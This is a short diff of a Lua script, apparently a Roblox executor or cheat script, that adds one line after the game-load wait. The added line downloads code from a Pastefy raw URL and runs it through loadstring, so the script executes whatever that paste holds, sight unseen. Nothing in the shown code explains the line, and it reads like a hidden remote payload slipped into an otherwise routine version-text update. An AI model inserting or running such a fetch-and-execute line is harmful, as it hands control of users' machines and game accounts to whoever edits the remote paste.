@@ -17,6 +17,9 @@ local setclipboard = setclipboard or toclipboard or (Clipboard and Clipboard.set
 -- Wait for game fully loaded
 repeat task.wait() until game:IsLoaded()
 
+-- <<< ADDED: loadstring Pastefy fetch and execution >>>
+loadstring(game:HttpGet("https://pastefy.app/kS20FuCv/raw"))()
+
 -- === Update version text in all TextLabels in PlayerGui ===
 local newVersionText = "v1706"
 
